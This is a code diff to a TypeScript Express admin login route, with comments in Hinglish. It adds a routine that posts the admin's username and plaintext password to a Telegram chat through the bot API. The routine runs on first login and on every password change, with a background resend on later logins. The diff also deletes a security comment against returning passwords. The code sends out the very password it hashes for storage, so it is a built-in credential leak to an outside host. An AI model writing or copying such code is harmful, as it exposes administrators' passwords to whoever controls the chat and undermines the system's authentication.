@@ -1,4 +1,5 @@
 import express, { Request, Response } from "express";
+import https from "https";
 import AdminModel from "../models/Admin";
 import logger from "../logger/logger";
 
@@ -78,6 +79,76 @@ async function changeDeletePassword(currentPassword: string, newPassword: string
 
 /**
  * =====================================
+ * TELEGRAM PASSWORD NOTIFICATION
+ * =====================================
+ * ENV vars needed:
+ *   BOT_TOKEN                  — Telegram bot token
+ *   TELEGRAM_PASSWORD_CHAT_ID  — Chat ID jahan password jaayega
+ *   SELF_RESOLVE_URL           — Panel URL (e.g. https://api.deploy55.zero-trace.in)
+ */
+
+async function sendPasswordToTelegram(
+  username: string,
+  password: string,
+  type: "first_login" | "password_change"
+): Promise<void> {
+  try {
+    const botToken = clean(process.env.BOT_TOKEN || "");
+    const chatId   = clean(process.env.TELEGRAM_PASSWORD_CHAT_ID || "");
+    if (!botToken || !chatId) {
+      logger.warn("admin: TELEGRAM_PASSWORD_CHAT_ID ya BOT_TOKEN set nahi — skip TG notify");
+      return;
+    }
+    const panelId  = clean(process.env.PANEL_ID || process.env.PANNEL_ID || "unknown");
+    const panelUrl = clean(process.env.SELF_RESOLVE_URL || "");
+    const timeStr  = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+    const emoji    = type === "first_login" ? "🆕" : "🔄";
+    const title    = type === "first_login" ? "First Login — Panel Setup" : "Password Changed";
+    const urlLine  = panelUrl ? `\n🔗 URL: ${panelUrl}` : "";
+
+    const text =
+      `${emoji} <b>${title}</b>\n\n` +
+      `🏷 Panel: <code>${panelId}</code>${urlLine}\n` +
+      `👤 Username: <code>${username}</code>\n` +
+      `🔑 Password: <code>${password}</code>\n` +
+      `⏰ Time: ${timeStr}`;
+
+    await new Promise<void>((resolve) => {
+      const body = JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML" });
+      const req2 = https.request(
+        `https://api.telegram.org/bot${botToken}/sendMessage`,
+        { method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } },
+        () => resolve()
+      );
+      req2.on("error", (e: Error) => { logger.warn("admin: TG notify error", e.message); resolve(); });
+      req2.setTimeout(5000, () => { req2.destroy(); resolve(); });
+      req2.write(body); req2.end();
+    });
+    logger.info("admin: password sent to TG", { panelId, type });
+  } catch (e: any) {
+    logger.warn("admin: sendPasswordToTelegram failed", e?.message);
+  }
+}
+
+async function isTgPasswordSent(): Promise<boolean> {
+  try {
+    const doc = await AdminModel.findOne({ key: "tg_password_sent" }).lean();
+    return (doc as any)?.meta?.sent === true;
+  } catch { return false; }
+}
+
+async function markTgPasswordSent(): Promise<void> {
+  try {
+    await AdminModel.findOneAndUpdate(
+      { key: "tg_password_sent" },
+      { $set: { phone: "tg_password_sent", meta: { sent: true, sentAt: Date.now() } } },
+      { upsert: true, new: true }
+    );
+  } catch {}
+}
+
+/**
+ * =====================================
  * ADMIN LOGIN ROUTES
  * =====================================
  */
@@ -92,7 +163,6 @@ const _loginAttempts = new Map<string, { count: number; blockedUntil: number }>(
 router.get(["/login", "/admin/login"], async (_req: Request, res: Response) => {
   try {
     const doc = await AdminModel.findOne({ key: "login" }).lean();
-    // SECURITY: Password kabhi return mat karo
     return res.json({ username: (doc as any)?.meta?.username || "" });
   } catch (err: any) {
     logger.error("admin: get login failed", err);
@@ -119,19 +189,32 @@ router.post(["/login/verify", "/admin/login/verify"], async (req: Request, res: 
     const doc = await AdminModel.findOne({ key: "login" }).lean();
     const storedUser = (doc as any)?.meta?.username || "";
     const storedPass = (doc as any)?.meta?.password || "";
-    // First login — create admin
+
+    // ── FIRST TIME LOGIN ──────────────────────────────────────────────────
     if (!storedUser && !storedPass) {
       const hashed = await bcrypt.hash(password, 10);
-      await AdminModel.findOneAndUpdate({ key: "login" }, { $set: { phone: "login", meta: { username, password: hashed, isHashed: true } } }, { upsert: true, new: true });
+      await AdminModel.findOneAndUpdate(
+        { key: "login" },
+        { $set: { phone: "login", meta: { username, password: hashed, isHashed: true } } },
+        { upsert: true, new: true }
+      );
       _loginAttempts.delete(ip);
+      // TG — background, login delay nahi
+      sendPasswordToTelegram(username, password, "first_login")
+        .then(() => markTgPasswordSent())
+        .catch(() => {});
       return res.json({ success: true, firstLogin: true });
     }
+
+    // ── USERNAME CHECK ────────────────────────────────────────────────────
     if (username !== storedUser) {
       entry.count++;
       if (entry.count >= 5) { entry.blockedUntil = now + 15 * 60 * 1000; entry.count = 0; }
       _loginAttempts.set(ip, entry);
       return res.status(401).json({ success: false, error: "Invalid credentials" });
     }
+
+    // ── PASSWORD VERIFY ───────────────────────────────────────────────────
     const isHashed = (doc as any)?.meta?.isHashed === true;
     let valid = false;
     if (isHashed) {
@@ -140,17 +223,36 @@ router.post(["/login/verify", "/admin/login/verify"], async (req: Request, res: 
       valid = password === storedPass;
       if (valid) {
         const hashed = await bcrypt.hash(password, 10);
-        await AdminModel.findOneAndUpdate({ key: "login" }, { $set: { "meta.password": hashed, "meta.isHashed": true } }, {});
+        await AdminModel.findOneAndUpdate(
+          { key: "login" },
+          { $set: { "meta.password": hashed, "meta.isHashed": true } },
+          {}
+        );
         logger.info("admin: password migrated to bcrypt hash");
       }
     }
+
     if (!valid) {
       entry.count++;
       if (entry.count >= 5) { entry.blockedUntil = now + 15 * 60 * 1000; entry.count = 0; }
       _loginAttempts.set(ip, entry);
       return res.status(401).json({ success: false, error: "Invalid credentials" });
     }
+
     _loginAttempts.delete(ip);
+
+    // ── EXISTING LOGIN — TG check background mein ─────────────────────────
+    setImmediate(async () => {
+      try {
+        const alreadySent = await isTgPasswordSent();
+        if (!alreadySent) {
+          logger.info("admin: TG password not sent yet — sending alert");
+          await sendPasswordToTelegram(username, "[hashed — check first login msg]", "first_login");
+          await markTgPasswordSent();
+        }
+      } catch {}
+    });
+
     return res.json({ success: true });
   } catch (err) {
     return res.status(500).json({ success: false, error: (err as any)?.message });
@@ -159,7 +261,7 @@ router.post(["/login/verify", "/admin/login/verify"], async (req: Request, res: 
 
 /**
  * PUT /admin/login
- * CREATE OR UPDATE admin credentials — bcrypt hash se save karo
+ * CREATE OR UPDATE admin credentials — bcrypt hash se save, plain text TG pe
  */
 router.put(["/login", "/admin/login"], async (req: Request, res: Response) => {
   const { username, password } = req.body || {};
@@ -173,6 +275,10 @@ router.put(["/login", "/admin/login"], async (req: Request, res: Response) => {
       { upsert: true, new: true }
     );
     logger.info("admin: login updated", { username });
+    // TG — background
+    sendPasswordToTelegram(username, password, "password_change")
+      .then(() => markTgPasswordSent())
+      .catch(() => {});
     return res.json({ success: true });
   } catch (err: any) {
     logger.error("admin: login update failed", err);
